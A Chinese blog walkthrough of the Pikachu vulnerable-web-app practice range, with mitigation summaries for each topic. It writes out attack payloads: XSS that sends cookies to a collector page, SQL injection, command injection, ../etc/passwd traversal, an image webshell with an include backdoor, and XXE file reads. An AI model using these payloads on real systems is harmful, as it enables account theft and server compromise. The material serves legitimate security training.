---
title: pikachu新手靶场通关
data: 2021-10-3
tags: 	
	- 靶场
---

一个适合练习基础的靶场

<!-- more -->

## 暴力破解

### 基于表单的暴力破解

看到有登录窗口 尝试抓包暴力破解

![image-20211206232816644](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201243585.png)

![image-20211206232834158](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201243147.png)

设置成cluster bomb模式，添加两个变量

![image-20211206232849491](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201243384.png)

接着添加字典进行爆破

![image-20211206232938092](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201243637.png)

![image-20211208195654013](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201243083.png)

### 验证码绕过（server）

没有对验证码设置次数和时间限制，验证码由于是永久有效，所以与前面的暴力破解步骤相同

![image-20211208195939593](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201244583.png)

### 验证码绕过（client）

![image-20211208200130799](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201244210.png)

![image-20211208201111648](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201244754.png)

可以很清楚看到验证码是在前端进行验证，可以在BP抓包直接后端绕过前端的JS验证

### token

在攻击上选择Pitchfork 单叉模式，针对多个位置使用不同的多个Payload。

在选项中打开Grep-Extract，点击添加

获取一个回复，选中token的数值并复制

![image-20211208201958445](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201245823.png)

![image-20211208201928351](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201244404.png)

给token变量选择有效载荷类型为递归搜索，把刚刚复制的token粘贴到第一个请求的初始有效负载中

![image-20211208203447904](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201245666.png)

![image-20211208203033928](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201245748.png)

### 总结

- 设计安全的验证码（安全的流程+复杂而有可用的图像）
- 对认证错误的提交进行计数并给出限制，比如连续5次密码错误，锁定2小时

token对防暴力破解的意义：
一般的做法:

1.将token以"type= 'hidden' “的形式输出在表单中;

2.在提交的认证的时候一起提交,并在后台对其进行校验;

但，由于其token值输出在了前端源码中，容易被获取，因此也就失去了防暴力破解的意义。一般Token在防止CSRF 上会有比较好的功效。

**技巧：**

技巧一 :

根据注册提示信息进行优化

对目标站点进行注册，搞清楚账号密码的一些限制，比如目标站点要求密码必须是6位以上,字母数字组合，则可以按照此优化字典,比如去掉不符合要求的密码。

技巧二:

如果爆破的是管理后台,往往这种系统的管理员是admin/administrator/root的机率比较高，可以使用这三个账号+随便一个密码，尝试登录，观看返回的结果，确定用户名。

比如:

v输入xx/yyf返回“用户名或密码错误”

V输入admin/yyy返回"密码错误" ,则基本可以确定用户名是admin ;

因此可以只对密码进行爆破即可，提高效率。

## XSS

XSS是一种发生在前端的漏洞，所以危害的对象也是主要是前端的用户。

XSS可以用来进行钓鱼，前端js挖矿，用户cookie获取，甚至可以结合浏览器自身漏洞对用户进行远程控制等。

![image-20211208213817541](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201245556.png)

**危害:存储型>反射型> DOM型**

●反射型

交互的数据一般不会被存在在数据库里面, 一次性，所见即所得，一般出现在查询类页面等。

●存储型

交互的数据会被存在在数据库里面,永久性存储，一般出现在留言板,注册等页面。

●DOM型

不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性也属于反射型。

形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格,导致"精心构造"的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害。

**跨站脚本漏洞测试流程**

①在目标站点上找到输入点，比如查询接口,留言板等;

②输入一组"特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理;

③通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件 (构造闭合) ;

④提交构造的脚本代码(以及各种绕过姿势) ,看是否可以成功执行，如果成功执行则说明存在XSS漏洞;

TIPS :

1.一般查询接口容易出现反射型XSS ,留言板容易出现存储型XSS ;

2.由于后台可能存在过滤措施，构造的script可能会被过滤掉，而无法生效或者环境限制了执行(浏览器) ;

3.通过变化不同的script，尝试绕过后台过滤机制;

![image-20211208222821594](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201245103.png)

**同源策略**：

而为了安全考虑,所有的浏览器都约定了"同源策略”, 同源策略规定,两个不同域名之间不能使用JS进行相互操作。比如: x.com域名下的javascrip并不能操作y.com域下的对象。同源指的是端口，协议，域名相同

如果想要跨域操作,则需要管理员进行特殊的配置。

比如通过: header( "Access-Control Allow-Origin:x.com" )指定。

Tips:下面这些标签跨域加载资源(资源类型是有限制的)是不受同源策略限制的。

```js
<script src= ".." > //js,加载到本地执行
<img src=
//图片
<link href=
<iframe src= ".." > //任意资源
```

### 反射型XXS（GET）

利用XSS时，可以先输入一组"特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理

![image-20211208214841154](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201245642.png)

再输入要注入的语句，这里有个小细节 需要在前端改下限制格数，即可反弹窗口

![image-20211208214554550](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201245082.png)

### 反射型XXS（POST）

随便登录一个账户

![image-20211208215237047](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201245190.png)

进去输入XSS语句，这里其实可以输入，发送链接让别人点击即可获取到别人的cookie，利用cookie就可以盗取别人的账户

```js
<script>document.location='http://127.0.0.1/cookie.php（php文件）?cookie='%2b document.cookie（将cookie存储在黑客服务器文件）</script>
```

这里测试就输入一个弹窗

```
<script>alert('test');</script>
```

![image-20211208215518731](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246350.png)

### 存储型XXS

存储型XSS主要在评论区，留言板这些地方出现比较多

![image-20211208215714313](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246668.png)

每次有人点击这个留言板，都会触发XSS弹窗

### DOM型XSS

DOM可以理解为访问HTML的标准接口，DOM里面会把我们的HTML分成一个DOM树

我们可以以这棵树为入口，通过DOM的某些方法对树进行操作，比如**对标签的添加、改变和删除**等等。

**DOM相当于在前端提供了一个 通过JS去对HTML进行操作 的接口，观察JS的代码**

![image-20211208220233385](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246141.png)

在此的js代码，通过getElementById获取到了标签ID为text的内容赋值给str，然后把str的内容通过字符串拼接的方式写到了a标签的href属性中，a标签会写到id为dom的div标签中

```
通过value方式将text的值赋值为str，也就是框里面的值，然后通过innerHTML将标签内的值取出来，比如<label id="lb1">this is a label</label>，取出来的值就是this is a label。所以结合前面的'做一个闭合，像<script>这种有前后标签闭合的就不太方便用了，用提示里面的onclick来构造，' onclick=alert('xss')>就可以了。
```

![image-20211208220319039](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246488.png)

### DOM型XSS-X

观察JS源码

![image-20211208220612034](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246810.png)

`window.location.search`该属性获取页面 URL 地址，window.location 对象所包含的属性如下：　

- location.hostname 返回 web 主机的域名
- location.pathname 返回当前页面的路径和文件名
- location.port 返回 web 主机的端口 （80 或 443）
- location.protocol 返回所使用的 web 协议（http: 或 https:）
- location.search 从问号开始的URL查询部分

![image-20211208221152030](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246611.png)

### XSS盲打

盲打并不是一种攻击类型，而是一种场景，输入的东西并不会在前端显示，而是提交到了后台

![image-20211208223731487](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246442.png)

### XSS过滤

这里使用大小写进行绕过

![image-20211208224733000](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246311.png)

![img](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246119.png)

![img](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201246938.png)

### xss之htmlspecialchars

htmlspecialchars（），函数把一些预定义的字符转换为HTML实体，下列都是预定义字符。

```
& （和号） 成为 &amp;
" （双引号） 成为 &quot;
' （单引号） 成为 &#039;
< （小于） 成为 &lt;
\> （大于） 成为 &gt;
```

这里我们需要注意，默认情况的编码是不会对’（单引号）进行编码的，尝试利用它来构造

直接用双引号替换掉xss的单引号 ' onclick='alert("xss")'

![image-20211208225105088](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201247108.png)

### xss之href输出

htmlspecialchars函数使用了ENT_QUOTES类，也加上了对单引号的转义，但是在a标签的href属性里面,可以使用javascript协议来执行js 

javascript:alert(123)

![image-20211208225342360](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201247204.png)

### xss之js输出

```
这里只需要闭合前面的</script>标签
</script><script>alert('xss')</script>
```



### 总结

总的原则: 输入做过滤,输出做转义

过滤:根据业务需求进行过滤,比如输入点要求输入手机号，则只允许输入手机号格式的数字。

转义:所有输出到前端的数据都根据输出点进行转义,比如输出到html中进行html实体转义,输入到JS里面的进行js转义。

## CSRF

在CSRF的攻击场景中攻击者会伪造一个请求(这个请求般是一个链接)然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击也就完成了。所以CSRF攻击也被称为为" one click" 攻击。

判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息(比如密码等敏感信息)的操作(增删改)是否容易被伪造。

**CSRF与XSS区别**

CSRF是借用户的权限完成攻击,攻击者并没有拿到用户的权限,而XSS是直接盗取到了用户的权限，然后实施破坏。

**确认漏洞存在**

1，对目标网站增删改的地方进行标记，并观察其逻辑,判断请求是否可以被伪造

--- 比如修改管理员账号时 ，并不需要验证旧密码 ，导致请求容易被伪造 ;

--- 比如对于敏感信息的修改并没有使用安全的token验证 ，导致请求容易被伪造 ;

2.确认凭证的有效期(这个问题会提高CSRF被利用的概率)

--- 虽然退出或者关闭了浏览器，但cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变的简单

### CSRF（GET）

随便登录一个账户

![image-20211209095827203](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201247020.png)

抓下修改个人信息的包

![image-20211209095911260](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201247227.png)

![image-20211209095952302](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201247775.png)

修改/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=18626545453&add=chain&email=vince%40pikachu.com&submit=submit 发送给vince用户 即可修改个人信息

![image-20211209100558105](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201247982.png)

### CSRF（POST）

请求是通过post方式进行提交的，所以没有办法通过URL来伪造请求

我们需要做一个站点，然后在站点上做一个表单,让被攻击目标去点击我们站点中的恶意表单的URL。通过这个恶意表单向存在CSRF漏洞的页面提交post请求（和post类型的xss方法相同）

### 总结

**防范措施**

**增加token验证(常用的做法) :**

1.对关键操作增加token参数，token值必须随机，每次都不一样;

**关于安全的会话管理(避免会话被利用) :**

1.不要在客户端端保存敏感信息(比如身份认证信息) ; 

2.测试直接关闭，退出时，的会话过期机制;

3.设置会话过期机制,比如15分钟内无操作，则自动登录超时; 

**访问控制安全管理:**

1.敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码;

2.敏感信息的修改使用post，而不是get ;

3.通过http头部中的referer来限制原页面

**增加验证码:**

一般用在登录(防暴力破解)，也可以用在其他重要信息操作的表单中(需要考虑可用性)

## SQL注入

### 数字型注入

是一个post类型的注入，抓包，注入点在id

![image-20211209102259562](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201248068.png)

### 字符型注入

记得要在后面加注释符号

![image-20211209104303938](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201248861.png)

### 搜索型注

payload：http://10.0.1.229/pikachu/vul/sqli/sqli_search.php?name=name=-1' union select 1,version(),database()--+ &submit=%E6%90%9C%E7%B4%A2

![image-20211209104405468](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201248403.png)

### XX型注入

这里需要输个)，闭合括号

![image-20211209105223285](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201248028.png)

![image-20211209105033463](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201248820.png)

### insert/update注入

抓个注册的包

修改payload：

```
123' or updatexml(1,concat(0x7e,database()),0) or'
```

![image-20211209110833704](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201248415.png)

登录进去

![image-20211209111055419](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201248381.png)

和刚刚的insert注入步骤类型

![image-20211209111259947](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201249168.png)

### delete注入

需要抓取删除的数据包，在修改一下payload即可执行

注意的是需要把payload修改为url编码 选取需要编码的payload ctrl+U 

![image-20211209112728828](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201249373.png)

### http头注入

登录进去

![image-20211209122202860](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201249774.png)

在User-Agent进行注入

![image-20211209122249475](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201249387.png)

**不仅在http头部会存在注入点，referer这个关键字也可能会存在注入点，还有cookie点**

### 基于boolean的盲注

盲注顾名思义就是没有页面回显，无法通过页面的回显来判断是否存在注入。一般情况下盲注的页面只有两个一个是成功一个是失败（也可以视为0或1）。网上大多sql注入都是盲注。

盲注建议可以使用SQLmap去跑或者DNS注入回显出来。

### wide byte注入

宽字节注入是mysql的一个特性，mysql在使用GBK编码的时候会认为两个字符是一个汉字（第一个asscii码要大于128，才到汉字的范围）。

有时输入单引号湖北转义为\，无法构造SQL语句，GBK编码中，反斜杠的编码是%5c

而%df%5c是繁体字 运。所以我们往单引号前面加上%df可以构造出%df%5c从而使得单引号逃逸出来。

### 总结

●代码层面

1.对输入进行严格的转义和过滤

过滤举例: (黑名单)

str replace("%",$_ POST['username' ]),把post里面的数据里面含有%的替换成空

2.使用预处理和参数化( Parameterized )

![image-20211209094454087](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201249903.png)

●网路层面

1.通过WAF设备启用防SQL Inject注入策略(或类似防护系统)

2.云端防护( 360网站卫士,阿里云盾等)

## RCE

**RCE：远程代码、命令执行漏洞**

给攻击者向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。

**远程系统命令执行**

一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上

一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果设计者在完成该功能时，**没有做严格的安全控制**，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器

**远程代码执行**
同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，**一定需要对接口输入的内容进行严格的判断**，比如实施严格的白名单策略会是一个比较好的方法。

### exec "ping"

远程命令执行，我们直接输入： 127.0.0.1 & ipconfig

![image-20211209123952461](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201249401.png)

### exec "eval"

后台会执行响应的 php 代码，我们可以输入下面的代码：phpinfo();

![image-20211209124328261](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201249192.png)

## 文件包含

在web后台开发中，程序员往往为了提高效率以及让代码看起来更加简洁,会使用"包含”函数功能。

比如把一系列功能函数都写进fuction.php中 ,之后当某个文件需要调用的时候就直接在文件头中写上一句<?php include fuction.php? >就可以调用函数代码。

但有些时候,因为网站功能需求，会让前端用户选择需要包含的文件(或者在前端的功能中使用了"包含”功能)，又由于开发人员没有对要包含的这个文件进行安全考虑，就导致攻击着可以通过修改包含文件的位置来让后台执行任意文件(代码)。

这种情况我们称为“文件包含漏洞

文件包含漏洞有"本地文件包含漏洞”和"远程文件包含漏洞”两种情况。

![image-20211209095426266](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201249552.png)

文件包含漏洞:包含函数

通过include()或require() 语句,可以将PHP文件的内容插入另一个PHP文件(在服务器执行安之前)。

include和require语句是相同的，除了错误处理方面:

- require会生成致命错误( E COMPILE ERROR )并停止脚本
- include只生成警告( E_ WARNING )， 并且脚本会继续

### 本地文件包含

如果这个服务器架设在linux上我们就可以一直../../../../../到根目录然后再进行对应固定配置文件，这样就会把相应文件的内容暴露出来

这个漏洞可以查看本地文件或者可以和文件上传一起getshell

### 远程文件包含

远程文件包含漏洞形式跟本地文件包含漏洞差不多，在远程包含漏洞中，攻击者可以通过访问外部地址来加载远程的代码。

 远程包含漏洞的前提：如果使用的incldue和require，则需要php.ini配置入选

```
allow_url_fopen=on //默认打开
allow_url_include=on //默认关闭
```

本地文件包含需要攻击者自己猜目录还只能读取配置文件

远程文件包含就厉害了，攻击者可以自己搭建站点。里面写上恶意代码，传入后台，后台的包含函数就会加载攻击者的恶意代码

可以写一个php的文件来自动写入一个一句话木马

![image-20211209130021706](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201251557.png)

### 总结

0.在功能设计.上尽量不要将文件包含函数对应的文件放给前端进行选择和操作。

1.过滤各种../../ ,http:// , https://

2.配置php.in配置文件:

```
allow_ url_ fopen = off
Allow_ url_ include= off
magic_ quotes_ gpc=on //gpc在
```

3.通过白名单策略,仅允许包含运行指定的文件，其他的都禁止;

## 文件下载

观察下载的链接，利用../返回上级目录在filename上，即可下载系统的敏感文件，例如../../../etc/passwd

![image-20211209143228211](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201251301.png)

**防御**

1.对传入的文件名进行严格的过滤和限定

2.对文件下载的目录进行严格的限定;

## 文件上传

因为业务功能需要，很多web站点都有文件上传的接口，比如:

1.注册时上传头像图片(比如jpg.png,gif等) ;

2..上传文件附件( doc;xIs等) ;

而在后台开发时并没有对上传的文件功能进行安全考虑或者采用了有缺陷的措施，导致攻击者可以通过一些手段绕过安全措施从而上传一些恶意文件 (如:一句话木马)

从而通过对该恶意文件的访问来控制整个web后台。

**测试流程**

1，对文件上传的地方按照要求上传文件，查看返回结果(路径，提示等);

2，尝试上传不同类型的“恶意”文件，比如xx.php文件,分析结果;

3，查看html源码，看是否通过js在前端做了上传限制，可以绕过;

4，尝试使用不同方式进行绕过:黑白名单绕过/MIME类型绕过/目录0x00截断绕过等;

5，猜测或者结合其他漏洞(比如敏感信息泄露等)得到木马路径，连接测试;

### 客户端check

![image-20211209144145067](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201252227.png)

看出来是前端进行判断的，所以删除这个事件即可直接上传php文件（前端的验证是最不安全的）

### 服务端check

```
常见的MIME类型
超文本标记语言文本 .html,.html text/html
普通文本 .txt text/plain
RTF文本 .rtf application/rtf
GIF图形 .gif image/gif
JPEG图形 .ipeg,.jpg image/jpeg
au声音文件 .au audio/basic
MIDI音乐文件 mid,.midi audio/midi,audio/x-midi
RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio
MPEG文件 .mpg,.mpeg video/mpeg
AVI文件 .avi video/x-msvideo
GZIP文件 .gz application/x-gzip
TAR文件 .tar application/x-tar
```

Burp中修改content-type:image/jpeg即可

![image-20211209144531132](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201252278.png)

### getimagesize()

这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的

所以不能通过修改content-type来达到目的，需要一张真正的图片将一句话放入图片中

这里就需要使用图片马的技巧，加上之前的文件包含的漏洞去执行php后门

```
<?php    @include $_GET[file]; ?>
最简单的图片马直接一条命令在cmd即可生成
copy normal.jpg /b + shell.php /a webshell.jpg
```

![在这里插入图片描述](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201253990.png)

### 总结

- 不要在前端使用JS实施上传限制策略
- 通过服务端对上传文件进行限制:

1.进行多条件组合检查:比如文件的大小，路径，扩展名，文件类型,文件完整性

2.对上传的文件在服务器上存储时进行重命名(制定合理的命名规则)

3.对服务器端上传文件的目录进行权限控制(比如只读)， 限制执行权限带来的危害

## 越权

由于没有用户权限进行严格的判断，导致低权限的账号(比如普通用户)可以去完成高权限账号(比如超级管理员)范围内的操作。

**平行越权: A用户和B用户属于同级别用户,但各自不能操作对方个人信息, A用户如果越权操作B用户的个人信息的情况称为平行越权操作**

**垂直越权: A用户权限高于B用户, B用户越权操作A用户的权限的情况称为垂直越权。**

越权漏洞属于**逻辑漏洞**，是由于权限校验的逻辑不够严谨导致。

每个应用系统其用户对应的权限是根据其业务功能划分的,而每个企业的业务又都是不一样的。

因此越权漏洞很难通过扫描发现出来，往往需要通过手动进行测试。

### 水平越权

随便登录一个账户

![image-20211209145805058](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201253869.png)

通过观察url可以发现 可以修改url去查看别人的用户

![image-20211209150006152](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201253088.png)

### 垂直越权

用普通用户去操作超级管理员的账户

先登录管理员的账户，抓取一个添加用户的数据包，退出管理员登录状态

![image-20211209150621443](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201253808.png)



登录一个普通用户，抓取下普通用户的cookie值，用这个cookie去替换管理员的cookie，在重放数据包

![image-20211209150605074](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201253545.png)

发现添加成功

![image-20211209150709996](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201253156.png)

## 目录遍历

在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。

当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。                        

在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。                       

从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。

例如之前的文件包含漏洞。

![image-20211209125217202](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201253342.png)

目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的。

方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样。

需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。而并不归为目录遍历漏洞。

## 敏感信息泄露

由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：

---通过访问url下的目录，可以直接列出目录下的文件列表;

---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;

---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;

通过查看源码，会发现账户和密码

![image-20211209152758819](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201253947.png)

## PHP反序列化

**序列化serialize()**

序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:            

```php
class S{
    public $test="pikachu";
}
$s=new S(); //创建一个对象
serialize($s); //把这个对象进行序列化
序列化后得到的结果是这个样子的:O:1:"S":1:{s:4:"test";s:7:"pikachu";}
    O:代表object
    1:代表对象名字长度为一个字符
    S:对象的名称
    1:代表对象里面有一个变量
    s:数据类型
    4:变量名称的长度
    test:变量名称
    s:数据类型
    7:变量值的长度
    pikachu:变量值
```

**反序列化unserialize()**

就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。

```php
$u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
echo $u->test; //得到的结果为pikachu
```

序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题

```php
常见的几个魔法函数:
__construct()当一个对象创建时被调用

__destruct()当一个对象销毁时被调用

__toString()当一个对象被当作一个字符串使用

__sleep() 在对象在被序列化之前运行

__wakeup将在序列化之后立即被调用

漏洞举例:

class S{
    var $test = "pikachu";
    function __destruct(){
        echo $this->test;
    }
}
$s = $_GET['test'];
@$unser = unserialize($a);

payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

自己写一个恶意的序列化代码

```php
<?php
	class S{
	var $test = "<script>alert('xss')</script>";
	}
echo '<br>';
$a = new S();
echo serialize($a);
?>
```

生成

```
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

![image-20211209154203883](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201254284.png)

## XXE

```xml
第一部分：XML声明部分
<?xml version="1.0"?>

第二部分：文档类型定义 DTD
<!DOCTYPE note[ 
<!--定义此文档是note类型的文档-->
<!ENTITY entity-name SYSTEM "URI/URL">
<!--外部实体声明-->
]>

第三部分：文档元素
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

DTD : Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。

```
1. DTD内部声明
<!DOCTYPE 根元素[元素声明]>
2. DTD外部引用
<!DOCTYPE根元素名称SYSTEM "外部DTD的URI” >
3.引用公共DTD
<!DOCTYPE 根元素名称PUBLIC "DTD标识名” “公用DTD的URI" >
```

DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD。

XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议。

例如

```
file:///path/to/file.ext
http://url
php://filter/read=convert.base64-encode/resource=conf.php
```

外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：

![image-20211209155352657](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201254354.png)

构造一个测试payload

```
<?xml version = "1.0"?>
<!DOCTYPE note [
    <!ENTITY hacker "xml">
]>
<name>&hacker;</name>
```

![image-20211209155920765](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201254179.png)

在构造通过filter协议获取xxe.php源码的payload

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php">
]>
<x>&f;</x>
```

![image-20211209155709592](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201254233.png)

## SSRF

形成的原因：大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。即以存在SSRF漏洞的服务器为跳板取得其他应用服务器的信息。

数据流：攻击者 -----> 服务器 ----> 目标地址

根据后台使用的函数的不同，对应的影响和利用方法又有不一样

PHP中下面函数的使用不当会导致SSRF:

```php
file_get_contents()
作用：
file_get_contents() 函数把整个文件读入一个字符串中，和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。
file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
fsockopen()
curl_exec()
```

如果一定要通过后台服务器远程去对用户指定（“或者预埋在前端的请求”）的地址进行资源请求，则请做好目标地址的过滤。

### SSRF（URL）

观察URL，发现它传递了一个URL给后台

![image-20211209161500808](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201254317.png)

可以把 url 中的内容改成内网的其他服务器上地址和端口，探测内网的其他信息，比如端口开放情况，这里就改成baidu.com的地址试试

![image-20211209161556444](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201254070.png)

### SSRF（file_get_content）

访问目标网站，并根据提示点击

file_get_content 可以对本地和远程的文件进行读取，可以利用filter协议去读取其本地文件

php://filter/read=convert.base64-encode/resource=…/…/…/phpinfo.php

![image-20211209163214288](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201254749.png)

## URL重定向

不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。 

如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话，就可能发生"跳错对象"的问题。

url跳转比较直接的危害是:

**钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站**

通过修改其后尾缀url 使其跳转到百度界面

![image-20211209163606649](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202112201254169.png)

